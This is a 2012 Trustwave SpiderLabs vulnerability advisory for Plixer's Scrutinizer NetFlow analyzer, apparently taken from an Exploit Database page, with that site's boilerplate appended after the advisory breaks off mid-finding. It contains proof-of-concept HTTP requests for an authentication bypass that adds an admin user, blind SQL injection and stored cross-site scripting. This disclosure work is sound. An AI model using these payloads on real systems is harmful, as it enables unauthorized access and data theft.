April 13, 2012

1 Minute Read

Trustwave SpiderLabs has published a new advisory yesterday for multiple vulnerabilities found in Scrutinizer NetFlow & sFlow Analyzer by Plixer International. For those who are unfamiliar with Scrutinizer NetFlow & sFlow Analyzer, it is a product used for network analysis to monitor the overal health of a network and reports statistics, such as which hosts, applications and protocols are consuming network bandwidth. These findings include a HTTP Authentication Bypass, SQL Injection, Persistent Cross-Site Scripting and Reflected Cross-Site Scripting vulnerabilities.

Tanya Secker who is a managing consultant for Trustwave SpiderLabs discovered these vulnerabilities in January of this year. SpiderLabs has reached out to Plixer International in February regarding these findings however the vendor declined to comment. Scrutinizer NetFlow & sFlow Analyzer version 8.6.2 (8.6.2.16204) has been confirmed vulnerable to these issues; however, other versions may be affected. We have confirmed that the latest stable release 9.0.1 (9.0.1.19899) has addressed all findings. So if you haven't already done so, make sure the latest version is installed.

Trustwave SpiderLabs has deployed protections for all these findings in the ModSecurity Commercial Rules Feed. Additionally, Trustwave's vulnerability scanning solution, TrustKeeper, has been updated to detect all findings.

For more details regarding this advisory, please visit:

Thanks to Ryan Barnett and Jonathan Claudius for their efforts to implement these protections for Trustwave products. Stay tuned for more advisory postings in the near future!

Trustwave SpiderLabs Security Advisory TWSL2012-008:
Multiple Vulnerabilities in Scrutinizer NetFlow & sFlow Analyzer

https://www.trustwave.com/spiderlabs/advisories/TWSL2012-008.txt

Published: 04/11/12
Version: 1.0

Vendor: Plixer International (http://www.plixer.com)
Product: Scrutinizer NetFlow and sFlow Analyzer
Version affected:  8.6.2 (8.6.2.16204) confirmed; others may be vulnerable

Product description:
Network analysis tool for monitoring the overall network health and reports
on which hosts, applications, protocols, etc. that are consuming network
bandwidth.

Finding 1: HTTP Authentication Bypass Vulnerability
CVE: CVE-2012-1258

The Scrutinizer web console provides a form-based login facility, requiring
users to authenticate to gain access to further functionality. A tiered
user access model is also used, where administrative and standard users
have a different selection of permissible functions. Authentication and
authorization is controlled by the cookie-based session management system.
Although this is implemented in a standardized way, the session tokens are
not required to perform privileged functions, such as adding users.

Example:

This request will add a user named "trustwave" with the password of
"trustwave" to the administrative user group.

#Request
GET /cgi-bin/userprefs.cgi?newUser=trustwave&pwd=trustwave&selectedUserGroup=1&= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 ( .NET CLR 3.5.30729)

Content-Length: 19

{"new_user_id":"9"}

Finding 2: SQL Injection
CVE: CVE-2012-1259

The Scrutinizer web console is prone to unauthenticated SQL Injection
attacks due to user input not being appropriately validated and passed
directly to the backend.  An attacker could exploit this vulnerability to
attempt to gain access to sensitive information within the database or to
perform other attacks on the system.

Example 1:

These requests/responses below show a blind SQL injection vector, where a
proof of concept is used to return a syntactically correct response from
the server (200 OK) followed by an incorrect one (500 Internal Server
Error).

#Request 1
GET /cgi-bin/scrut_fa_exclusions.cgi?name%3anew28%3a28=on&name%3anew7%3a7=on&name%3anew27%3a27=on&name%3anew13%3a13=on&standalone=&name%3anew5%3a5=on&name%3anew14%3a14=on&name%3anew9%3a9=on&user_id=&name%3anew23%3a23=on&name%3anew17%3a17=on&name%3anew11%3a11=on&name%3anew24%3a24=on&addip=')%20AND%20('a'='a&name%3anew18%3a18=on&name%3anew21%3a21=on&name%3anew19%3a19=on&name%3anew22%3a22=on&nbaupdate=1&name%3anew12%3a12=on&name%3anew25%3a25=on&name%3anew2%3a2=on&name%3anew1%3a1=on&name%3anew10%3a10=on&name%3anew15%3a15=on&name%3anew26%3a26=on&name%3anew4%3a4=on&name%3anew6%3a6=on HTTP/1.1

#Response 2
HTTP/1.1 500 Internal Server Error
Date: Tue, 31 Jan 2012 23:52:18 GMT
Server: Apache
Last-Modified: Fri, 17 Dec 2010 02:01:03 GMT

Accept-Ranges: bytes
Content-Length: 1096
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

Example 2:

The "getPermissionsAndPreferences" variable within the following request is
also vulnerable to a blind time-based attack.  The example payload included
will result in the server taking a delay of approximately five seconds
before returning a response.

#Request
http://127.0.0.1/cgi-bin/login.cgi?getPermissionsAndPreferences=1%20AND%20SLEEP(5)&session_id=OyAOiECuFdtRbEBY&nocache=12_13_12_734

Example 3:

It should be noted that the other area referenced below returns SQL errors
when a comment character is introduced into the bolded parameters and may
therefore also indicate that they are vulnerable to SQL injection.  The
below request demonstrates this activity.

#Request
http://127.0.0.1/d4d/alarms.php?loadAlarms=1&user_id=1&step=10&page=0&search_str=test&column=msg&fa_algorithm=all&order=modified_ts

Finding 3: Persistent Cross-site Scripting
CVE: CVE-2012-1260

The Scrutinizer web console stores unmodified user-supplied parameters
within its database.  No input validation or character encoding is
performed, resulting in the possibility of client-supplied variables
forming aspects of page content in such a way as to affect the syntax of
the HTML content.

Example:

The below requests/response demonstrate how an attacker could use this to
implant arbitrary Javascript via the "newUser" parameter.

#Request 1
GET /cgi-bin/userprefs.cgi?newUser=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&pwd=guest2&selectedUserGroup=1&= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 ( .NET CLR 3.5.30729)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Proxy-Connection: keep-alive
Content-Length: 6

Accessing the "Admin" Panel using the below URL results in the stored
JavaScript executing in the browser. It is noted that due to the previous
flaw documented above this may also be executed unauthenticated and results
in the disclosure of all user group names and IDs, along with all usernames
and userids stored in the application. This is achieved via the following
URL:

#Request 2
http://127.0.0.1/cgi-bin/userprefs.cgi?menu=1&nocache=5_26_33_895

#Response 2
HTTP/1.1 200 OK
Date: Thu, 17 Nov 2011 10:40:34 GMT
Server: Apache
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8
Content-Length: 276

{"groups":[{"name":"<script>alert(2)</script>","id":"4"},{"name":"<script>alert(document.cookie)</script>","id":"3"},{"name":"Administrators","id":"1"},{"name":"Guests","id":"2"}],"users":[{"name":"\"><script>alert(1)</script>","user_id":"12"},{"name":"admin","user_id":"1"}]}

Finding 4: Reflected Cross-site Scripting
CVE: CVE-2012-1261

The Scrutinizer web console suffers from a Cross Site Scripting
vulnerability in the 'standalone' variable of the
'cgi-bin/scrut_fa_exclusions.cgi' page.  No input validation or character
encoding is performed, resulting in the possibility of client-supplied
variables forming aspects of page content in such a way as to affect the
syntax of the HTML content.

Example:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
